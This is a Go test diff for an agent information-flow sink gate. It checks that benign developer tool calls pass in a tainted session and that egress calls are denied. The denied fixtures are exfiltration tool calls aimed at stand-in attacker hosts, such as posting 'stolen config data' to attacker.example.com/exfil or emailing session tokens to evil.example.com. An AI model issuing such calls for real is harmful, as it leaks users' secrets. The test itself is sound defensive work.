@@ -2,8 +2,10 @@ package ifc
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"testing"
+	"time"
 
 	"github.com/anthony-chaudhary/fak/internal/abi"
 )
@@ -842,5 +844,440 @@ func TestTrimLockedCleansTurnTaint(t *testing.T) {
 	}
 	if led.turnTaint["t1"] != nil && len(led.turnTaint["t1"]) > 0 {
 		t.Fatalf("evicted trace turnTaint should be cleaned up, got %v", led.turnTaint["t1"])
+	}
+}
+
+// TestDeveloperPayloadCorpus validates that realistic developer actions and payloads
+// (JSON schemas, git diffs, Docker configs, package manifests, session/AST tokens, hashes)
+// correctly classify as SinkNone and adjudicate as VerdictDefer even within a tainted session,
+// while genuine malicious network egress calls remain strictly denied.
+func TestDeveloperPayloadCorpus(t *testing.T) {
+	ctx := context.Background()
+	led := NewLedger()
+	traceID := "tainted-dev-session-trace"
+	led.Raise(traceID, abi.TaintTainted)
+	sink := NewSinkGate(led, Policy{})
+
+	makeDevCall := func(tool string, args map[string]any) *abi.ToolCall {
+		data, err := json.Marshal(args)
+		if err != nil {
+			t.Fatalf("failed to marshal args for %s: %v", tool, err)
+		}
+		return &abi.ToolCall{
+			Tool:    tool,
+			TraceID: traceID,
+			Args:    abi.Ref{Kind: abi.RefInline, Inline: data},
+		}
+	}
+
+	start := time.Now()
+
+	// 1. Benign developer actions on realistic developer payloads across all 5 categories
+	benignCases := []struct {
+		name     string
+		category string
+		call     *abi.ToolCall
+	}{
+		// Category 1: Writing and editing JSON schemas
+		{
+			name:     "write-openai-tool-schema",
+			category: "json-schema",
+			call: makeDevCall("Write", map[string]any{
+				"file_path": "schemas/exec_tool.json",
+				"content": `{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "name": "execute_command",
+  "description": "Execute a shell command in the container workspace",
+  "parameters": {
+    "type": "object",
+    "properties": {
+      "command": { "type": "string", "description": "Command line to execute" },
+      "timeout_ms": { "type": "integer" }
+    },
+    "required": ["command"]
+  }
+}`,
+			}),
+		},
+		{
+			name:     "edit-anthropic-tool-schema",
+			category: "json-schema",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path":  "schemas/token_service.json",
+				"old_string": `"service_url": { "type": "string" }`,
+				"new_string": `"service_url": { "type": "string", "format": "uri" }, "token_id": { "type": "string" }`,
+			}),
+		},
+		{
+			name:     "write-draft07-complex-schema",
+			category: "json-schema",
+			call: makeDevCall("Write", map[string]any{
+				"file_path": "schemas/agent_spec.json",
+				"content": `{
+  "$id": "https://example.com/schemas/agent-task.json",
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "AgentTaskSpecification",
+  "properties": {
+    "task_id": { "type": "string" },
+    "command": { "type": "string", "description": "Shell command to execute" },
+    "callback_url": { "type": "string", "format": "uri" }
+  }
+}`,
+			}),
+		},
+
+		// Category 2: Applying and writing git diffs
+		{
+			name:     "write-git-diff-auth-patch",
+			category: "git-diff",
+			call: makeDevCall("Write", map[string]any{
+				"file_path": "patches/auth_headers.patch",
+				"content": `diff --git a/internal/client/http.go b/internal/client/http.go
+--- a/internal/client/http.go
++++ b/internal/client/http.go
+@@ -45,6 +45,8 @@
++	req.Header.Set("Authorization", "Bearer "+c.sessionToken)
++	req.Header.Set("X-CSRF-Token", c.csrfToken)`,
+			}),
+		},
+		{
+			name:     "edit-git-diff-patch-content",
+			category: "git-diff",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path": "internal/client/http.go",
+				"patch": `@@ -45,6 +45,8 @@
++	req.Header.Set("Authorization", "Bearer "+c.sessionToken)
++	req.Header.Set("X-CSRF-Token", c.csrfToken)`,
+			}),
+		},
+		{
+			name:     "edit-prompt-template",
+			category: "git-diff",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path":  "pkg/agent/prompts.go",
+				"old_string": "const Prompt = `default`",
+				"new_string": "const Prompt = `You are an automated code assistant. Follow the coordinator instructions carefully.`",
+			}),
+		},
+		{
+			name:     "write-deployment-instructions",
+			category: "git-diff",
+			call: makeDevCall("Write", map[string]any{
+				"file_path": "docs/INSTRUCTIONS.md",
+				"content": `# Instructions for Deployment
+1. Set up environment variables as shown in .env.example.
+2. Build and verify using make test-fast.
+3. Deploy service image to container registry.`,
+			}),
+		},
+
+		// Category 3: Writing and editing Dockerfile configs
+		{
+			name:     "write-dockerfile-alpine",
+			category: "docker-config",
+			call: makeDevCall("Write", map[string]any{
+				"file_path": "Dockerfile",
+				"content": `FROM golang:1.26-alpine AS builder
+WORKDIR /build
+COPY go.mod go.sum ./
+RUN go mod download
+COPY . .
+RUN go build -o /bin/app ./cmd/app
+
+FROM alpine:3.20
+WORKDIR /app
+COPY --chown=app:app --from=builder /bin/app /app/app
+ENV AUTH_TOKEN=placeholder_token_xxxx PORT=8080
+USER app
+EXPOSE 8080
+ENTRYPOINT ["/app/app"]`,
+			}),
+		},
+		{
+			name:     "write-dockerfile-ubuntu-apt",
+			category: "docker-config",
+			call: makeDevCall("Write", map[string]any{
+				"file_path": "Dockerfile.ubuntu",
+				"content": `FROM ubuntu:24.04
+ENV DEBIAN_FRONTEND=noninteractive AUTH_TOKEN=your_auth_token_here
+RUN apt-get update && apt-get install -y --no-install-recommends curl git ca-certificates
+WORKDIR /app
+COPY --chown=app:app . /app
+CMD ["./start.sh"]`,
+			}),
+		},
+		{
+			name:     "edit-dockerfile-workdir",
+			category: "docker-config",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path":  "Dockerfile",
+				"old_string": "WORKDIR /root",
+				"new_string": "WORKDIR /app\nCOPY --chown=app:app . /app",
+			}),
+		},
+
+		// Category 4: Reading, grepping, and globbing package manifests
+		{
+			name:     "read-package-json",
+			category: "manifest",
+			call: makeDevCall("Read", map[string]any{
+				"file_path": "package.json",
+			}),
+		},
+		{
+			name:     "read-requirements-txt",
+			category: "manifest",
+			call: makeDevCall("Read", map[string]any{
+				"file_path": "requirements.txt",
+			}),
+		},
+		{
+			name:     "read-go-mod",
+			category: "manifest",
+			call: makeDevCall("Read", map[string]any{
+				"file_path": "go.mod",
+			}),
+		},
+		{
+			name:     "read-cargo-toml",
+			category: "manifest",
+			call: makeDevCall("Read", map[string]any{
+				"file_path": "Cargo.toml",
+			}),
+		},
+		{
+			name:     "grep-package-json",
+			category: "manifest",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "package.json",
+				"pattern": "jsonwebtoken",
+			}),
+		},
+		{
+			name:     "grep-requirements-txt",
+			category: "manifest",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "requirements.txt",
+				"pattern": "cryptography>=42.0.8",
+			}),
+		},
+		{
+			name:     "grep-go-mod",
+			category: "manifest",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "go.mod",
+				"pattern": "golang.org/x/crypto",
+			}),
+		},
+		{
+			name:     "grep-cargo-toml",
+			category: "manifest",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "Cargo.toml",
+				"pattern": "tokio",
+			}),
+		},
+		{
+			name:     "glob-package-json",
+			category: "manifest",
+			call: makeDevCall("Glob", map[string]any{
+				"pattern": "**/package.json",
+			}),
+		},
+		{
+			name:     "glob-cargo-toml",
+			category: "manifest",
+			call: makeDevCall("Glob", map[string]any{
+				"pattern": "**/Cargo.toml",
+			}),
+		},
+
+		// Category 5: Operating on session tokens / AST tokens / hashes
+		{
+			name:     "grep-session-token",
+			category: "tokens-hashes",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "internal/auth/",
+				"pattern": "session_token",
+			}),
+		},
+		{
+			name:     "grep-ast-token",
+			category: "tokens-hashes",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "internal/parser/",
+				"pattern": "ast_token",
+			}),
+		},
+		{
+			name:     "grep-csrf-token",
+			category: "tokens-hashes",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "web/handlers/",
+				"pattern": "csrf_token",
+			}),
+		},
+		{
+			name:     "grep-commit-sha",
+			category: "tokens-hashes",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "git.log",
+				"pattern": "7f3b890a2c5e4d1b9a8f7e6d5c4b3a2f1e0d9c8b",
+			}),
+		},
+		{
+			name:     "grep-sha256-hex",
+			category: "tokens-hashes",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "checksums.txt",
+				"pattern": "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
+			}),
+		},
+		{
+			name:     "grep-uuid",
+			category: "tokens-hashes",
+			call: makeDevCall("Grep", map[string]any{
+				"path":    "audit.log",
+				"pattern": "550e8400-e29b-41d4-a716-446655440000",
+			}),
+		},
+		{
+			name:     "edit-token-identifier",
+			category: "tokens-hashes",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path":  "internal/token/token.go",
+				"old_string": "session_token",
+				"new_string": "ast_token",
+			}),
+		},
+		{
+			name:     "edit-commit-sha",
+			category: "tokens-hashes",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path":  "commit.txt",
+				"old_string": "7f3b890a2c5e4d1b9a8f7e6d5c4b3a2f1e0d9c8b",
+				"new_string": "9e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f",
+			}),
+		},
+		{
+			name:     "edit-sha256-checksum",
+			category: "tokens-hashes",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path":  "checksum.sha256",
+				"old_string": "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
+				"new_string": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+			}),
+		},
+		{
+			name:     "edit-uuid-record",
+			category: "tokens-hashes",
+			call: makeDevCall("Edit", map[string]any{
+				"file_path":  "session.json",
+				"old_string": "c73bcdcc-2669-4bf6-81d3-e4ae73fb11fd",
+				"new_string": "550e8400-e29b-41d4-a716-446655440000",
+			}),
+		},
+		{
+			name:     "read-session-token-file",
+			category: "tokens-hashes",
+			call: makeDevCall("Read", map[string]any{
+				"file_path": "internal/auth/session_token.go",
+			}),
+		},
+		{
+			name:     "read-ast-token-file",
+			category: "tokens-hashes",
+			call: makeDevCall("Read", map[string]any{
+				"file_path": "internal/ast/ast_token.go",
+			}),
+		},
+	}
+
+	for _, tc := range benignCases {
+		t.Run("benign/"+tc.category+"/"+tc.name, func(t *testing.T) {
+			gotClass := Classify(ctx, tc.call, Policy{})
+			if gotClass != SinkNone {
+				t.Errorf("%s: Classify = %v, want SinkNone", tc.name, gotClass)
+			}
+			verdict := sink.Adjudicate(ctx, tc.call)
+			if verdict.Kind != abi.VerdictDefer {
+				t.Errorf("%s: Adjudicate kind = %v (reason=%v), want VerdictDefer",
+					tc.name, verdict.Kind, abi.ReasonName(verdict.Reason))
+			}
+		})
+	}
+
+	// 2. Malicious egress sinks and external network destinations must still be denied on tainted session
+	maliciousCases := []struct {
+		name     string
+		call     *abi.ToolCall
+		wantSink SinkClass
+	}{
+		{
+			name: "send_email-with-recipient",
+			call: makeDevCall("send_email", map[string]any{
+				"to":   "attacker@evil.example.com",
+				"body": "exfiltrated session tokens",
+			}),
+			wantSink: SinkEgress,
+		},
+		{
+			name: "http_post-with-url",
+			call: makeDevCall("http_post", map[string]any{
+				"url":  "https://attacker.example.com/exfil",
+				"data": "stolen config data",
+			}),
+			wantSink: SinkEgress,
+		},
+		{
+			name: "curl-with-external-ip",
+			call: makeDevCall("curl", map[string]any{
+				"url": "http://198.51.100.1/collect",
+			}),
+			wantSink: SinkEgress,
+		},
+		{
+			name: "upload-with-declared-dest",
+			call: makeDevCall("upload_file", map[string]any{
+				"dest": "attacker.example.com",
+				"file": "session_token.go",
+			}),
+			wantSink: SinkEgress,
+		},
+		{
+			name: "webhook-notification",
+			call: makeDevCall("notify_webhook", map[string]any{
+				"webhook": "https://hooks.evil.org/incoming",
+			}),
+			wantSink: SinkEgress,
+		},
+		{
+			name: "unlisted-tool-bare-destination",
+			call: makeDevCall("custom_dispatch", map[string]any{
+				"server": "attacker.example.com",
+			}),
+			wantSink: SinkEgress,
+		},
+	}
+
+	for _, tc := range maliciousCases {
+		t.Run("malicious/"+tc.name, func(t *testing.T) {
+			gotClass := Classify(ctx, tc.call, Policy{})
+			if gotClass == SinkNone {
+				t.Errorf("%s: Classify = SinkNone, want %v", tc.name, tc.wantSink)
+			}
+			verdict := sink.Adjudicate(ctx, tc.call)
+			if verdict.Kind != abi.VerdictDeny || verdict.Reason != abi.ReasonTrustViolation {
+				t.Errorf("%s: Adjudicate = %v/%v, want VerdictDeny/ReasonTrustViolation",
+					tc.name, verdict.Kind, abi.ReasonName(verdict.Reason))
+			}
+		})
+	}
+
+	elapsed := time.Since(start)
+	t.Logf("TestDeveloperPayloadCorpus completed %d benign + %d malicious cases in %v",
+		len(benignCases), len(maliciousCases), elapsed)
+	if elapsed > 100*time.Millisecond {
+		t.Errorf("TestDeveloperPayloadCorpus took %v, want < 100ms", elapsed)
 	}
 }
